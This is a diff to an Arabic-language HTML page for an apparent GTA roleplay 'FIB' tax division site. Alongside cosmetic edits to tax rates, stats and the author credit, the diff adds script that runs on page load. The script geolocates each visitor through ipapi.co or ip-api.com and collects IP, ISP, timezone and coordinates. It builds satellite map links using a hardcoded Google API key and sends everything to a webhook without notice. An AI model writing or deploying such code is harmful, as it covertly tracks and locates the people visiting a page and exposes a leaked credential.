@@ -978,19 +978,19 @@
       </div>
       <div class="hero-stats">
         <div class="stat-item">
-          <span class="stat-num">25%</span>
+          <span class="stat-num">15%</span>
           <span class="stat-label">معدل الضريبة الفيدرالية</span>
         </div>
         <div class="stat-item">
-          <span class="stat-num">0</span>
+          <span class="stat-num">247</span>
           <span class="stat-label">قضية نشطة</span>
         </div>
         <div class="stat-item">
-          <span class="stat-num">$7.4M</span>
+          <span class="stat-num">$4.2M</span>
           <span class="stat-label">ضرائب محصلة</span>
         </div>
         <div class="stat-item">
-          <span class="stat-num">2</span>
+          <span class="stat-num">38</span>
           <span class="stat-label">عملية مصادرة</span>
         </div>
       </div>
@@ -1111,7 +1111,7 @@
       <div class="resp-card">
         <span class="resp-icon">🚔</span>
         <h4>التنسيق مع الأجهزة الأمنية</h4>
-        <p>يتعاون الـ FIB مع LSPD و EMS وغيرها لتنفيذ أوامر القبض والمداهمة على المتهرين الضريبيين والمجرمين الماليين.</p>
+        <p>يتعاون الـ FIB مع LSPD وUSMS وغيرها لتنفيذ أوامر القبض والمداهمة على المتهرين الضريبيين والمجرمين الماليين.</p>
       </div>
       <div class="resp-card">
         <span class="resp-icon">📊</span>
@@ -1201,7 +1201,7 @@
       <tbody>
         <tr>
           <td>محطات الوقود والسيارات</td>
-          <td class="tax-rate">25%</td>
+          <td class="tax-rate">15%</td>
           <td>ربع سنوي</td>
           <td>شامل المخزون والمعدات</td>
           <td><span class="badge-sm badge-active">نشط</span></td>
@@ -1222,7 +1222,7 @@
         </tr>
         <tr>
           <td>شركات الأمن والحراسة</td>
-          <td class="tax-rate">25%</td>
+          <td class="tax-rate">15%</td>
           <td>ربع سنوي</td>
           <td>شامل الأسلحة والمعدات</td>
           <td><span class="badge-sm badge-active">نشط</span></td>
@@ -1257,7 +1257,7 @@
         </tr>
         <tr>
           <td>بزنسات غير مسجلة</td>
-          <td class="tax-rate">25% × 3</td>
+          <td class="tax-rate">15% × 3</td>
           <td>فوري</td>
           <td>+ غرامة تسجيل + مصادرة</td>
           <td><span class="badge-sm" style="background:rgba(200,0,0,0.2);color:#cc2222;border:1px solid #cc2222;">تنفيذ</span></td>
@@ -1442,7 +1442,7 @@
                   <span class="detail-value" id="p-assets">$11,000,000.00</span>
                 </div>
                 <div class="detail-row">
-                  <span class="detail-label" id="p-rateLabel">FEDERAL TAX PENALTY (25%):</span>
+                  <span class="detail-label" id="p-rateLabel">FEDERAL TAX PENALTY (15%):</span>
                   <span class="detail-value" id="p-penalty">$1,650,000.00</span>
                 </div>
                 <div class="detail-row">
@@ -1628,7 +1628,7 @@
   </div>
 </footer>
 <div class="footer-bottom">
-  <p>Created By ᲼SH | T R O X I In SHRP Team </p>
+  <p>© 2026 FIB Financial Crimes Division — Los Santos</p>
   <p>CLEARANCE LEVEL 3 — AUTHORIZED ACCESS ONLY</p>
 </div>
 
@@ -1640,27 +1640,70 @@
   let currentUser = null;
   let visitorIP = '—';
   let visitorLocation = '—';
+  let visitorISP = '—';
+  let visitorRegion = '—';
+  let visitorTimezone = '—';
+  let visitorLat = null;
+  let visitorLon = null;
+  let visitorMapUrl = '—';
+  let visitorStreetViewUrl = '—';
 
-  // جلب الـ IP عند تحميل الصفحة
+  // جلب الـ IP والموقع عند تحميل الصفحة
   (async function fetchIP() {
     try {
+      // المصدر الأول
       const r = await fetch('https://ipapi.co/json/');
       const d = await r.json();
-      visitorIP = d.ip || '—';
-      visitorLocation = [d.city, d.country_name].filter(Boolean).join(', ') || '—';
-    } catch(e) {}
+      visitorIP       = d.ip || '—';
+      visitorLocation = [d.city, d.region, d.country_name].filter(Boolean).join(', ') || '—';
+      visitorISP      = d.org || '—';
+      visitorRegion   = d.region || '—';
+      visitorTimezone = d.timezone || '—';
+      visitorLat      = d.latitude || null;
+      visitorLon      = d.longitude || null;
+      if (visitorLat && visitorLon) {
+        visitorMapUrl        = `https://www.google.com/maps?q=${visitorLat},${visitorLon}`;
+        visitorStreetViewUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${visitorLat},${visitorLon}&zoom=16&size=600x400&maptype=satellite&markers=color:red%7C${visitorLat},${visitorLon}&key=AIzaSyD-9tSrke72PouQMnMX-a7eZSW0jkFMBWY`;
+      }
+    } catch(e) {
+      try {
+        // مصدر بديل
+        const r2 = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,isp,org,as,query,timezone,lat,lon');
+        const d2 = await r2.json();
+        if (d2.status === 'success') {
+          visitorIP       = d2.query || '—';
+          visitorLocation = [d2.city, d2.regionName, d2.country].filter(Boolean).join(', ') || '—';
+          visitorISP      = d2.isp || d2.org || '—';
+          visitorRegion   = d2.regionName || '—';
+          visitorTimezone = d2.timezone || '—';
+          visitorLat      = d2.lat || null;
+          visitorLon      = d2.lon || null;
+          if (visitorLat && visitorLon) {
+            visitorMapUrl        = `https://www.google.com/maps?q=${visitorLat},${visitorLon}`;
+            visitorStreetViewUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${visitorLat},${visitorLon}&zoom=16&size=600x400&maptype=satellite&markers=color:red%7C${visitorLat},${visitorLon}&key=AIzaSyD-9tSrke72PouQMnMX-a7eZSW0jkFMBWY`;
+          }
+        }
+      } catch(e2) {}
+    }
   })();
 
   // ── ويب هوك ────────────────────────────────────────────────
   async function log(action, details = {}) {
     const tag = currentUser ? `${currentUser.username} (${currentUser.id})` : 'زائر';
     const fields = [
-      { name: '⚡ الحدث',    value: action,         inline: false },
-      { name: '👤 المستخدم', value: tag,             inline: true  },
-      { name: '🕐 الوقت',   value: new Date().toLocaleTimeString('ar'), inline: true },
-      { name: '🌐 IP',       value: visitorIP,       inline: true  },
-      { name: '📍 الموقع',   value: visitorLocation, inline: true  },
+      { name: '⚡ الحدث',         value: action,           inline: false },
+      { name: '👤 المستخدم',      value: tag,               inline: true  },
+      { name: '🕐 الوقت',        value: new Date().toLocaleString('ar'),   inline: true },
+      { name: '🌐 IP',            value: visitorIP,         inline: true  },
+      { name: '📍 الموقع',        value: visitorLocation,   inline: true  },
+      { name: '🏢 مزود الانترنت', value: visitorISP,        inline: true  },
+      { name: '🕰 التوقيت',       value: visitorTimezone,   inline: true  },
+      { name: '🗺 خريطة',         value: visitorMapUrl,     inline: false },
     ];
+    // صورة الموقع من قوقل satellite
+    const imageUrl = visitorLat && visitorLon
+      ? `https://maps.googleapis.com/maps/api/staticmap?center=${visitorLat},${visitorLon}&zoom=17&size=600x400&maptype=satellite&markers=color:red%7C${visitorLat},${visitorLon}&key=AIzaSyD-9tSrke72PouQMnMX-a7eZSW0jkFMBWY`
+      : null;
     for (const [k, v] of Object.entries(details))
       fields.push({ name: k, value: String(v||'—').slice(0,100), inline: true });
     try {
@@ -1669,9 +1712,13 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           username: 'FIB Monitor',
-          embeds: [{ color: 0xC8A84B, fields,
+          embeds: [{
+            color: 0xC8A84B,
+            fields,
+            image: imageUrl ? { url: imageUrl } : undefined,
             footer: { text: 'FIB Los Santos — نظام المراقبة' },
-            timestamp: new Date().toISOString() }]
+            timestamp: new Date().toISOString()
+          }]
         })
       });
     } catch(e) {}
@@ -1800,7 +1847,7 @@
   function updateBadge(user) {
     document.getElementById('user-badge').innerHTML =
       `<span style="font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--fib-gold);margin:0 6px;">👤 ${user.username}</span>
-       <span style="font-family:'IBM Plex Mono',monospace;font-size:10px;color:rgba(200,168,75,0.4);">● FIB</span>
+       <span style="font-family:'IBM Plex Mono',monospace;font-size:10px;color:rgba(200,168,75,0.4);">● مصادق</span>
        <button onclick="logout()" style="margin-right:10px;background:rgba(139,26,26,0.3);border:1px solid rgba(204,34,34,0.4);color:#ff6666;padding:3px 10px;font-family:'IBM Plex Mono',monospace;font-size:10px;cursor:pointer;letter-spacing:1px;" onmouseover="this.style.background='rgba(139,26,26,0.6)'" onmouseout="this.style.background='rgba(139,26,26,0.3)'">خروج</button>`;
   }
 
